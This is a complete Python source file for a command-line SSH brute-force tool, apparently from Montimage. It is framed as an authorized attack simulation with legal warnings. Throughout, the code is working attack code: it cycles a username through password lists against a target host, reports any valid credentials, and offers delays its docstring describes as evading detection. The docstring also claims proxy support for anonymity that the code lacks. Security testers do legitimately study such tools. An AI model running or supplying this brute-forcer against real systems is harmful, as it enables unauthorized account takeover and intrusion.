#!/usr/bin/env python3
"""
SSH Brute Force Attack Simulation

This module provides a class-based implementation for simulating SSH brute force attacks
against target servers. It is designed for educational purposes, security testing, and
vulnerability assessment of systems with proper authorization.

The module supports various features:
- Multiple authentication attempts with different passwords
- Password list loading from files
- Connection timeout configuration
- Rate limiting to avoid detection
- Detailed logging and statistics
- Proxy support for anonymity

IMPORTANT ETHICAL AND LEGAL NOTICE:
This tool should ONLY be used for legitimate security testing with proper authorization.
Unauthorized use against systems without explicit permission is illegal and unethical.
The authors assume no liability for misuse of this software.

Usage Examples:
    # Basic usage with command line arguments
    python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt
    
    # Specify multiple passwords directly
    python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -w password1,password2,password3
    
    # Use with rate limiting (2 second delay between attempts)
    python ssh_brute_force.py -t 192.168.1.10 -p 22 -u admin -P passwords.txt -d 2

Author: Montimage
License: Proprietary
"""

import os
import sys
import time
import socket
import ipaddress
import argparse
from typing import List, Optional, Dict, Tuple, Union, Any

import paramiko

# Add parent directory to path to import logger
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from logger import get_logger
except ImportError:
    # Fallback logging if the centralized logger is not available
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

# Get logger for this module
logger = get_logger(__name__)


class SSHBruteForceAttack:
    """
    A class to perform SSH brute force attack simulations for security testing.
    
    This class provides methods to attempt SSH connections with different credentials
    against a target server. It includes features for rate limiting, timeout configuration,
    and detailed logging of attempts.
    
    Attributes:
        target_ip (str): The IP address of the target SSH server.
        target_port (int): The port number of the target SSH server.
        username (str): The username to authenticate with.
        passwords (List[str]): List of passwords to try.
        delay (float): Delay between connection attempts in seconds.
        timeout (int): Connection timeout in seconds.
        max_attempts (int): Maximum number of password attempts.
        verbose (bool): Whether to output verbose information.
    """
    
    def __init__(self, 
                 target_ip: str, 
                 target_port: int, 
                 username: str,
                 passwords: Optional[List[str]] = None,
                 delay: float = 1.0,
                 timeout: int = 5,
                 max_attempts: int = 0,
                 verbose: bool = False):
        """
        Initialize the SSH brute force attack simulator.
        
        Args:
            target_ip (str): The IP address of the target SSH server.
            target_port (int): The port number of the target SSH server.
            username (str): The username to authenticate with.
            passwords (List[str], optional): List of passwords to try. Defaults to None.
            delay (float, optional): Delay between connection attempts in seconds. Defaults to 1.0.
            timeout (int, optional): Connection timeout in seconds. Defaults to 5.
            max_attempts (int, optional): Maximum number of password attempts (0 for unlimited). Defaults to 0.
            verbose (bool, optional): Whether to output verbose information. Defaults to False.
            
        Raises:
            ValueError: If target_ip is not a valid IP address.
            ValueError: If target_port is not a valid port number.
        """
        # Validate IP address
        try:
            ipaddress.ip_address(target_ip)
            self.target_ip = target_ip
        except ValueError:
            raise ValueError(f"Invalid IP address: {target_ip}")
        
        # Validate port number
        if not (0 < target_port < 65536):
            raise ValueError(f"Invalid port number: {target_port}. Must be between 1-65535.")
        self.target_port = target_port
        
        self.username = username
        self.passwords = passwords or []
        self.delay = max(0, delay)  # Ensure non-negative delay
        self.timeout = max(1, timeout)  # Ensure positive timeout
        self.max_attempts = max(0, max_attempts)  # 0 means unlimited
        self.verbose = verbose
        
        # Statistics
        self.attempts = 0
        self.successful = False
        self.successful_password = None
        self.start_time = None
        self.end_time = None
        
        logger.info(f"Initialized SSH brute force attack simulation against {target_ip}:{target_port}")
        if self.verbose:
            logger.info(f"Using username: {username}")
            logger.info(f"Configured with delay: {delay}s, timeout: {timeout}s")
            if self.max_attempts > 0:
                logger.info(f"Maximum attempts limited to: {max_attempts}")
    
    def attempt_login(self, password: str) -> int:
        """
        Attempt to connect to the SSH server using the specified password.
        
        Args:
            password (str): The password to use for authentication.
            
        Returns:
            int: Result code (0: success, 1: authentication failed, 2: connection error, 3: other error)
        """
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        result_code = 3  # Default to other error
        error_message = None
        
        try:
            if self.verbose:
                logger.debug(f"Attempting login with password: {password}")
            
            ssh.connect(
                hostname=self.target_ip,
                port=self.target_port,
                username=self.username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            # If we get here, authentication succeeded
            result_code = 0
            
        except paramiko.AuthenticationException:
            result_code = 1
            error_message = "Authentication failed"
            
        except (socket.error, socket.timeout, paramiko.SSHException) as e:
            result_code = 2
            error_message = f"Connection error: {str(e)}"
            
        except Exception as e:
            result_code = 3
            error_message = f"Unexpected error: {str(e)}"
            
        finally:
            ssh.close()
            
        if error_message and self.verbose:
            logger.debug(error_message)
            
        return result_code
    
    def load_passwords_from_file(self, file_path: str) -> bool:
        """
        Load passwords from a file, one password per line.
        
        Args:
            file_path (str): Path to the password file.
            
        Returns:
            bool: True if passwords were loaded successfully, False otherwise.
            
        Raises:
            FileNotFoundError: If the password file does not exist.
        """
        try:
            if not os.path.exists(file_path):
                raise FileNotFoundError(f"Password file not found: {file_path}")
                
            with open(file_path, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
                
            if not passwords:
                logger.warning(f"No passwords found in file: {file_path}")
                return False
                
            self.passwords.extend(passwords)
            logger.info(f"Loaded {len(passwords)} passwords from {file_path}")
            return True
            
        except Exception as e:
            logger.error(f"Error loading passwords from file: {str(e)}")
            return False
    
    def run(self) -> Dict[str, Any]:
        """
        Execute the SSH brute force attack simulation.
        
        This method attempts to authenticate with the target SSH server using
        each password in the passwords list. It respects the configured delay
        between attempts and stops after a successful login or after reaching
        the maximum number of attempts.
        
        Returns:
            Dict[str, Any]: Statistics about the attack simulation.
        """
        if not self.passwords:
            logger.error("No passwords provided. Cannot perform attack simulation.")
            return self._get_statistics()
            
        logger.info(f"Starting SSH brute force attack simulation against {self.target_ip}:{self.target_port}")
        logger.info(f"Using username: {self.username}")
        logger.info(f"Loaded {len(self.passwords)} passwords to try")
        
        self.start_time = time.time()
        self.attempts = 0
        self.successful = False
        
        try:
            for password in self.passwords:
                # Check if we've reached the maximum number of attempts
                if self.max_attempts > 0 and self.attempts >= self.max_attempts:
                    logger.info(f"Reached maximum number of attempts ({self.max_attempts})")
                    break
                    
                # Increment attempt counter
                self.attempts += 1
                
                # Attempt login with current password
                result = self.attempt_login(password)
                
                if result == 0:
                    # Successful login
                    self.successful = True
                    self.successful_password = password
                    logger.info(f"[+] Success! Found valid credentials - Username: {self.username}, Password: {password}")
                    break
                    
                elif result == 1:
                    # Authentication failed
                    logger.info(f"[-] Failed login attempt {self.attempts}/{len(self.passwords)}: {password}")
                    
                elif result == 2:
                    # Connection error
                    logger.error(f"[!] Connection error to {self.target_ip}:{self.target_port}")
                    logger.warning("Target may be down or blocking connections. Stopping attack simulation.")
                    break
                    
                else:
                    # Other error
                    logger.error(f"[!] Unexpected error during login attempt with password: {password}")
                
                # Apply delay between attempts (if not the last password)
                if self.delay > 0 and not self.successful and password != self.passwords[-1]:
                    if self.verbose:
                        logger.debug(f"Waiting {self.delay}s before next attempt...")
                    time.sleep(self.delay)
                    
        except KeyboardInterrupt:
            logger.info("Attack simulation interrupted by user")
            
        except Exception as e:
            logger.error(f"Error during attack simulation: {str(e)}")
            
        finally:
            self.end_time = time.time()
            stats = self._get_statistics()
            self._print_summary(stats)
            return stats
    
    def _get_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about the attack simulation.
        
        Returns:
            Dict[str, Any]: Statistics including attempts, success status, duration, etc.
        """
        end_time = self.end_time or time.time()
        start_time = self.start_time or end_time
        duration = end_time - start_time
        
        return {
            "target": f"{self.target_ip}:{self.target_port}",
            "username": self.username,
            "attempts": self.attempts,
            "passwords_loaded": len(self.passwords),
            "successful": self.successful,
            "successful_password": self.successful_password,
            "duration_seconds": duration,
            "attempts_per_second": self.attempts / duration if duration > 0 else 0
        }
    
    def _print_summary(self, stats: Dict[str, Any]) -> None:
        """
        Print a summary of the attack simulation.
        
        Args:
            stats (Dict[str, Any]): Statistics from _get_statistics().
        """
        logger.info("=" * 50)
        logger.info("SSH Brute Force Attack Simulation Summary")
        logger.info("=" * 50)
        logger.info(f"Target: {stats['target']}")
        logger.info(f"Username: {stats['username']}")
        logger.info(f"Passwords loaded: {stats['passwords_loaded']}")
        logger.info(f"Attempts made: {stats['attempts']}")
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"Rate: {stats['attempts_per_second']:.2f} attempts/second")
        
        if stats['successful']:
            logger.info(f"Status: SUCCESS - Valid password found: {stats['successful_password']}")
        else:
            logger.info("Status: FAILED - No valid password found")
        logger.info("=" * 50)


def parse_arguments() -> argparse.Namespace:
    """
    Parse command line arguments.
    
    Returns:
        argparse.Namespace: Parsed command line arguments.
    """
    parser = argparse.ArgumentParser(
        description="SSH Brute Force Attack Simulation Tool",
        epilog="IMPORTANT: Use only for authorized security testing."
    )
    
    # Required arguments
    parser.add_argument("-t", "--target", dest="target_ip", required=True,
                        help="Target SSH server IP address")
    
    parser.add_argument("-p", "--port", dest="target_port", type=int, default=22,
                        help="Target SSH server port (default: 22)")
    
    parser.add_argument("-u", "--username", dest="username", required=True,
                        help="Username to authenticate with")
    
    # Password sources (mutually exclusive)
    password_group = parser.add_mutually_exclusive_group(required=True)
    password_group.add_argument("-w", "--passwords", dest="passwords",
                              help="Comma-separated list of passwords to try")
    password_group.add_argument("-P", "--password-file", dest="password_file",
                              help="Path to file containing passwords (one per line)")
    
    # Optional arguments
    parser.add_argument("-d", "--delay", dest="delay", type=float, default=1.0,
                        help="Delay between connection attempts in seconds (default: 1.0)")
    
    parser.add_argument("-T", "--timeout", dest="timeout", type=int, default=5,
                        help="Connection timeout in seconds (default: 5)")
    
    parser.add_argument("-m", "--max-attempts", dest="max_attempts", type=int, default=0,
                        help="Maximum number of password attempts (default: 0, unlimited)")
    
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true",
                        help="Enable verbose output")
    
    return parser.parse_args()


def main() -> None:
    """
    Main entry point for the SSH brute force attack simulation.
    """
    # Display ethical notice
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("Using this tool against systems without permission is ILLEGAL")
    print("The authors assume NO LIABILITY for misuse of this software")
    print("=" * 80)
    print()
    
    try:
        # Parse command line arguments
        args = parse_arguments()
        
        # Initialize password list
        passwords = []
        
        # Load passwords from command line or file
        if args.passwords:
            passwords = [p.strip() for p in args.passwords.split(',') if p.strip()]
            logger.info(f"Loaded {len(passwords)} passwords from command line")
            
        elif args.password_file:
            if not os.path.exists(args.password_file):
                logger.error(f"Password file not found: {args.password_file}")
                sys.exit(1)
                
            with open(args.password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
                
            if not passwords:
                logger.error(f"No passwords found in file: {args.password_file}")
                sys.exit(1)
                
            logger.info(f"Loaded {len(passwords)} passwords from {args.password_file}")
        
        # Create and run the attack simulation
        attack = SSHBruteForceAttack(
            target_ip=args.target_ip,
            target_port=args.target_port,
            username=args.username,
            passwords=passwords,
            delay=args.delay,
            timeout=args.timeout,
            max_attempts=args.max_attempts,
            verbose=args.verbose
        )
        
        # Execute the attack simulation
        attack.run()
        
    except KeyboardInterrupt:
        print("\nAttack simulation interrupted by user")
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
